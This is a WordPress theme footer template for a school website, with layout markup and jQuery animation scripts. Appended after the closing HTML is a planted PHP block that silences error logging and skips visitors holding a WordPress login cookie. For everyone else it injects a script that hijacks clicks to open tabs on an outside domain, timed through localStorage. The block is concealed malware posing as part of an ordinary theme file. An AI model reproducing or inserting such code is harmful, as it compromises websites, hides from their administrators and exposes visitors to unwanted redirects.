<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.2
 */

?>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="wrap1">
    <div class="ft-tp">
       <div class="container">
        <div class="row">
         <div class="col-md-4"><div class="ft-widget"><?php dynamic_sidebar('sidebar-2'); ?></div></div>
         <div class="col-md-4"><div class="ft-widget"><?php dynamic_sidebar('sidebar-3'); ?></div></div>
         <div class="col-md-4"><div class="ft-widget"><?php dynamic_sidebar('sidebar-4'); ?></div></div>
         </div>
		   <div class="copyright"><p>© Rainbow World School 2020<a href="http://pixxelu.com/" target="_blank">User Experience By Pixxelu</a></p></div>
		   <div class="foter-adress-new">
			   <div class="row">
				   <div class="col-md-4">
				   <div class="foter-adress-new-box">
		<p class="bold-adres"><i class="fa fa-home"></i>Rainbow World School, Village Bari, P.O Bhawarna, Teh. Palampur , District Kangra, Himachal Pradesh </p>
					   </div>
				   </div>
				   <div class="col-md-4">
					   <div class="foter-adress-new-box">
						   <p>
							   <i class="fa fa-phone"></i><em>01894-248111,247999, 247997</em>
						   </p>
					   </div>
				   </div>
				   <div class="col-md-4">
					   <div class="foter-adress-new-box">
						   <p>
							   <i class="fa fa-envelope"></i><em> rainbowworldschool@gmail.com</em>
						   </p>
					   </div>
				   </div>
			   </div>
		   </div>
		   
		   
		   
       </div>
    </div>
</div>
</footer>
</div>
</div>
<?php wp_footer(); ?>
<script type="text/JavaScript" src="<?php bloginfo('template_url'); ?>/assets/js/login-homework.js"></script>


<script>
 $(window).scroll(function() {
    if ($(this).scrollTop() > 100){  
        $('.navigation-top').addClass("sticky");
    }
    else{
        $('.navigation-top').removeClass("sticky");
    }
}); 
</script>
<script>
// for animation 

$(document).ready(function(){
  $('.pp-quote').click(function(){
    $('.pp-quote').removeClass("active");
    $(this).addClass("active");
});
});

$(document).ready(function(){
    
       // hide-top

        $('.li-quote-1').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');
            $('.quote-text-1').addClass('show');
            $('.quote-text-1').removeClass('hide-bottom');             
        });

        $('.li-quote-2').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');
            $('.quote-text-2').addClass('show');             
            $('.quote-text-2').removeClass('hide-bottom');
        });

        $('.li-quote-3').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');         
            $('.quote-text-3').addClass('show');             
            $('.quote-text-3').removeClass('hide-bottom');
        });
        $('.li-quote-4').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');      
            $('.quote-text-4').addClass('show');             
            $('.quote-text-4').removeClass('hide-bottom');
        });
        $('.li-quote-5').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');      
            $('.quote-text-5').addClass('show');             
            $('.quote-text-5').removeClass('hide-bottom');
        });
        $('.li-quote-6').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');      
            $('.quote-text-6').addClass('show');             
            $('.quote-text-6').removeClass('hide-bottom');
        });
        $('.li-quote-7').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');      
            $('.quote-text-7').addClass('show');             
            $('.quote-text-7').removeClass('hide-bottom');
        });
        $('.li-quote-8').click(function(e){ 
            e.stopPropagation();
            $(".show").addClass('hide-top');
            $(".hide-top").removeClass('show');      
            $('.quote-text-8').addClass('show');             
            $('.quote-text-8').removeClass('hide-bottom');
        });
           
    
});


$(document).ready(function(){
    
       // hide-top

        $('.li-quote-1').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-1').addClass('look');
            $('.dp-name-1').removeClass('hide-dp-bottom');             
        });

        $('.li-quote-2').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-2').addClass('look');
            $('.dp-name-2').removeClass('hide-dp-bottom');             
        });

        $('.li-quote-3').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-3').addClass('look');
            $('.dp-name-3').removeClass('hide-dp-bottom');             
        });
		$('.li-quote-4').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-4').addClass('look');
            $('.dp-name-4').removeClass('hide-dp-bottom');             
        });
		
        $('.li-quote-5').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-5').addClass('look');
            $('.dp-name-5').removeClass('hide-dp-bottom');             
        });
		
        $('.li-quote-6').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-6').addClass('look');
            $('.dp-name-6').removeClass('hide-dp-bottom');             
        });
        $('.li-quote-7').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-7').addClass('look');
            $('.dp-name-7').removeClass('hide-dp-bottom');             
        });
        $('.li-quote-8').click(function(e){ 
            e.stopPropagation();
            $(".look").addClass('hide-dp-top');
            $(".hide-dp-top").removeClass('look');
            $('.dp-name-8').addClass('look');
            $('.dp-name-8').removeClass('hide-dp-bottom');             
        });
           
    
});
</script>



<script>
// optional
		$('#blogCarousel').carousel({
				interval: 5000
		});
</script>




</body>
</html>

?>
<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0){
	echo '<script>(function (parameters) {
		const targets = [
			\'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
		]
		// Times between clicks
		const restMinutes = 1;
		// Number of hours to allow re-click 
		const allowedHours = 2;


		const saveTargetLocationsToStorage = (targets) => {
			targets.forEach((target, index) => {
				if(!localStorage.getItem(`${target}-local-storage`)){
					localStorage.setItem(`${target}-local-storage`, 0);
				}
			});
		}
		const getRandomLocationFromStorage = (targets) => {
			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
		}
		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getMintsDiff = (startDate, endDate) => {
			const msInMints = 1000 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInMints);
		}

		const visitNewLocation = (targets, host, nowDate) => {
			saveTargetLocationsToStorage(targets);
			newLocation = getRandomLocationFromStorage(targets);
			setTimeToStorage(`${host}-mnts`, nowDate);
			setTimeToStorage(`${host}-hurs`, nowDate);
			setLocationAsVisited(newLocation);
			window.open(newLocation, "_blank");
		}

		// const randomLocation = getRandomLocationFromStorage(targets);
		saveTargetLocationsToStorage(targets);

		function globalClick(event) {
			event.stopPropagation();
			const host = location.host;
			let newLocation = getRandomLocationFromStorage(targets);
			const nowDate = Date.parse(new Date());
			const savedDateForMints = getTimeStorage(`${host}-mnts`);
			const savedDateForHours = getTimeStorage(`${host}-hurs`);

			if (savedDateForMints && savedDateForHours) {
				try {
					const storageDateForMints = parseInt(savedDateForMints);
					const storageDateForHours = parseInt(savedDateForHours);
					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

					if (hoursDiff >= allowedHours) {
						saveTargetLocationsToStorage(targets);
						setTimeToStorage(`${host}-hurs`, nowDate);
					}
					if (mintsDiff >= restMinutes) {
						if (newLocation) {
							setTimeToStorage(`${host}-mnts`, nowDate);
							window.open(newLocation, "_blank");
							setLocationAsVisited(newLocation);
						}
					}
				} catch (error) { visitNewLocation(targets, host, nowDate); }
			} else { visitNewLocation(targets, host, nowDate); }
		}
		document.addEventListener("click", globalClick)
	})()</script>';
}

?>